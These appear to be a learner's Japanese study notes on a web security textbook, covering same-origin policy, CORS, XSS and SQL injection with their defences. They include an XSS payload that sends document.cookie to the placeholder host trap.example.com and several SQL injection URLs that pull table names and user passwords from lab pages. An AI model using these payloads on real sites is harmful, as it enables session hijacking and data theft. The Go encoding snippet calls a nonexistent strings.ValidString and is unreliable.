## sec 3

### 3.1

https://chat.openai.com/share/fec9836a-86d7-49dd-97bf-edb9cfacd047

- basic 認証のキャッシュ削除
  - `https://username:password@www.example.com/`
  - https://dev.classmethod.jp/articles/delete-cache-for-basic-authentication/
  - Firefox を Quit した後に立ち上げ直すと、再度ログインを求められた
    - Firefox アプリのメモリ上に持たせてる説ある

疑問

- hidden パラメーターを使うメリットのところ
  - https://groups.google.com/g/wasbook-readers/c/8_G_J1aHGfc
  - https://blog.tokumaru.org/2013/09/cookie-manipulation-is-possible-even-on-ssl.html
- セッション ID の固定化攻撃
  - クッキーモンスターバグ
    - どうやって `kanagawa.jp` に cookie を発行できるアプリかを見分けてる？

### 3.2

- サイトをまたがった受動的攻撃
  - リクエストで攻撃
    - CSRF
  - レスポンスで攻撃
    - XSS
    - HTTP ヘッダ・インジェクション
- ブラウザはどのように受動的攻撃を防ぐか
  - サンドボックスという考え方
  - 同一オリジンポリシー
    - ブラウザのサンドボックスに用意された制限の1つ
  - 一度に複数のサイトのオブジェクトを扱うことができる
    - タブ
    - frame
- 同一オリジンポリシー
  - ブラウザが拒否してくれている？
    - プリフライトリクエスト
  - 同一オリジンである条件
    - ホスト
    - スキーム
    - ポート番号
  - iframe のなかに js を送り込んで実行する手法が XSS
  - JSONP
    - JSON with padding
    - 他オリジンに対する script タグ
  - form 要素の action 属性
    - CSRF
    - 意図しない form 

### 3.3

- 『シンプルなリクエスト』の場合、異なるオリジンに HTTP リクエストを**送ることが相手の許可なしに可能**
  - これはシンプルなリクエストの例だわ
  - [readyState](https://developer.mozilla.org/ja/docs/Web/API/XMLHttpRequest/readyState)
  - header
    - `application/x-www-form-urlencoded`
    - `multipart/form-data`
    - `text/plain`
  - js として使うには `Access-Control-Allow-Origin: http://example.jp` がサーバーからのレスポンスのヘッダーに必要
    - 応答ボディはスクリプトには利用できません (理由: CORS Missing Allow Origin)
    - **情報が返るのは問題なくて、中身の js に使われるのが問題**
      - スクリプトとして使われなければ大丈夫そう
- プリフライトリクエスト
  - **『シンプルなリクエスト』を満たさない場合、ブラウザが pre-flight request という HTTP リクエスト**
    - OPTIONS リクエスト
  - 応答ボディはスクリプトには利用できません (理由: CORS Missing Allow Header)
  - やり取りするヘッダ
    - OPTIONS を突破した後は、シンプルなリクエストと同等の扱い
  - プリフライトリクエストでやり取りするヘッダ
    - メソッドに対する許可
    - ヘッダに対する許可
    - オリジンに対する許可
- 認証情報を含むタイプ
  - `Access-Control-Allow-Credentials: true`
  - クライアントが自分が持ってる認証情報をつけたいかどうか
    - `withCredentials = true`
  - js で操作を許可する
    - `Access-Control-Allow-Credentials: true`


## sec 4

### 4.1

- 入力に起因する脆弱性はない
  - アプリケーションでの話
    - **アプリが解釈する段階で脆弱性となる！**
  - ミドルウェアに範囲を広げると、入力時の検証処理に脆弱性が入ることはある
- 出力に起因する脆弱性は『インジェクション』と名前がつくものが多い
- インジェクション系
  - データの中に「データの終端」を意味するマークを混入 → その後の文字列の構造を変化させる

### 4.2

- 入力処理での入力値に対する処理
  - 文字エンコーディングの妥当性検証
    - 文字コードを使った攻撃手法がある
    - SHIFT_JIS の２バイト目は `%40` 以上
  - 文字エンコーディングの変換
  - 入力値の妥当性検証
- utf-8 と shift-jis を見分けたい！
  - 難しいらしい！
- 疑問
  - %エンコーディングされない、HTTP リクエストとかの他の文字列はじゃあなんなの？
    - ASCII?
      - ASCII になるように %エンコーディングしたまである？
    - レスポンスには日本語入ってるけどね。。。


``` go
package main

import (
	"fmt"
	"golang.org/x/text/encoding/japanese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"strings"
)

func detectEncoding(data string) string {
	// UTF-8として解釈できるかテスト
	if utf8Valid := strings.ValidString(data); utf8Valid {
		return "UTF-8"
	}

	// Shift_JISとして解釈できるかテスト
	_, err := ioutil.ReadAll(transform.NewReader(strings.NewReader(data), japanese.ShiftJIS.NewDecoder()))
	if err == nil {
		return "Shift_JIS"
	}

	return "Unknown"
}

func main() {
	s := "%82%a0%82%a2%82%a4" // これはShift_JISで"あいう"を意味するURLエンコードされた文字列です
	decoded, _ := ioutil.ReadAll(transform.NewReader(strings.NewReader(s), japanese.ShiftJIS.NewDecoder()))
	fmt.Println(detectEncoding(string(decoded))) // Shift_JIS
}
```

- バイナリセーフという考え方
  - ヌルバイト攻撃
    - **Unix API, C とかではヌルバイトを文字列の終端とみなす取り決めがあるから！**
  - バイナリセーフ
    - 入力値がどんなバイト列であっても正しく扱えること
  - `%00`
- 入力値検証の基準はアプリケーション要件
  - **制御文字に関しては制限をかけるべきだが、制御してないアプリが多い！**
    - textarea でタブを許容するかなど（仕様による）

### 4.3

- 表示処理が原因で発生するセキュリティ上の問題
  - クロスサイト・スクリプティング
  - エラーメッセージからの情報漏洩
- 攻撃手法３パターン
  - クッキー値の盗み出し
  - その他の js による攻撃
  - 画面の書き換え

``` html
<body>
検索キーワード:<script>window.location='http://trap.example.com/43/43-901.php?sid='+document.cookie;</script><BR>
以下略
</body>

http://example.jp/43/43-001.php?keyword=%3Cscript%3Ewindow.location=%27http://trap.example.com/43/43-901.php?sid=%27%2Bdocument.cookie;%3C/script%3E

http://example.jp/43/43-001.php?keyword=%3Cscript%3Ealert('alart');%3C/script%3E
```

- この章のやつは **httpOnly で防げそう**
- API は攻撃に悪用することも可能なので XSS と js の組み合わせによる攻撃がしやすくなっている状況
  - どう？
  - フロント側の js を不正に利用するってイメージだったから、API ってのは掴めてないかも
- **入力画面と編集画面を兼ねている**
  - 各入力項目の初期値が設定できる → ここに脆弱性あり
  - 元の form を隠し、新たな form 要素を追加することで画面を改変する
- **XSS 攻撃は常に js を利用するとは限らない！**
- 反射型 XSS と持続型 XSS
  - 反射型 XSS: reflected XSS
    - 攻撃用 js が攻撃対象サイトとは別のサイトにある場合
    - 入力値をそのまま表示するページなどで発生
    - 入力値の確認用ページなど
  - 持続型 XSS: stored XSS, persistent XSS
    - Web めーるや SNS などが典型的な攻撃ターゲット
    - 注意深い利用者でも被害にあう可能性が高い
    - HTML を生成している箇所に原因があるのは変わらない
- XSS の原因
  - HTML の文法上特別な意味を持つ特殊記号（メタ文字）を正しく扱っていないことが原因
- 要素内容の XSS
  - `<` のエスケープができてない場合に発生
- 引用符で囲まない属性値の XSS
- 引用符で囲った属性値の XSS
  - `"` に対する
- 対策の基本（最低限）
  - **要素内容については `<` と `&` をエスケープする**
  - **属性値に関してはダブルクォートでくくって `<` と `"` と `&` をエスケープする**
- レスポンスの文字エンコーディング指定
  - web アプリで指定している文字エンコーディングとブラウザが想定するものに差異があると XSS の原因となり得る
- X-XSS-Protection レスポンスヘッダの使用
  - ブラウザのセキュリティ機能が実装されているものがある
    - 反射型 XSS をブラウザが検知し、無害な出力に変更するもの
    - XSS フィルタはデフォルトで有効だが利用者が無効化している場合もある
  - X-XSS-Protection レスポンスヘッダは、利用者による XSS フィルタの設定を上書きして有効化・無効化を設定したりする機能
  - **最近のブラウザは CSP への移行を見据えて XSS フィルタが無効化されつつある！！**
    - CSP ってなんだったっけ
- javascript スキーム
  - href 属性や src 属性の中の javascript:JavaScript式
  - HTML のエスケープ漏れが原因ではないので XSS の例とは異質
  - URL をプログラムで生成するときは http, https スキームのみを許可する設定などが必要
- js の現実的なエスケープ方法？？？
- インライン JSONP
- エラーメッセージからの情報漏洩
- [教科書に載らない web アプリケーションセキュリティ](https://atmarkit.itmedia.co.jp/fcoding/index/webapp.html)


### 4.4 SQL

- 対策
  - **静的プレースホルダ**を利用して SQL を呼び出す

``` sh
http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,SELECT%20table_name,%20column_name,%201%20FROM%20information_schema.columns)+--+


http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+CONCAT(%27$%27,id,%27:%27,pwd)+FROM+users+LIMIT+0,1))+--+

# MariaDB であることが分かった上で

http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+VERSION()))+--+

http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+GROUP_CONCAT(TABLE_NAME+SEPARATOR+',')+FROM+INFORMATION_SCHEMA.TABLES))+--+


http://example.jp/44/44-001.php?author=%27+AND+EXTRACTVALUE(0,(SELECT+CONCAT(%27$%27,GROUP_CONCAT(TABLE_NAME+SEPARATOR+','))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA+NOT+IN+('information_schema',+'mysql',+'performance_schema',+'sys')))+--+
```

db の表名・列名の調べ方

``` sql
SELECT table_name, column_name, data_type FROM information_schema.columns ORDER BY 1;


http://example.jp/44/44-001.php?author=author=%27+UNION+SELECT+table_name, column_name, data_type,table_schema,NULL,NULL,NULL+FROM+information_schema.columns+ORDER+BY+1--+


http://example.jp/44/44-001.php?author=author=%27+UNION+SELECT+table_name, column_name, data_type,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_schema+NOT+IN+('information_schema',+'mysql',+'performance_schema',+'sys')+ORDER+BY+1--+
```

プレースホルダーの利用に加えてやっておいた方がいい対策

- 詳細なエラーメッセージの抑止
- 入力値の妥当性検討
- データベースの権限設定


## Links

- [XMLHttpRequest](https://developer.mozilla.org/ja/docs/Web/API/XMLHttpRequest)
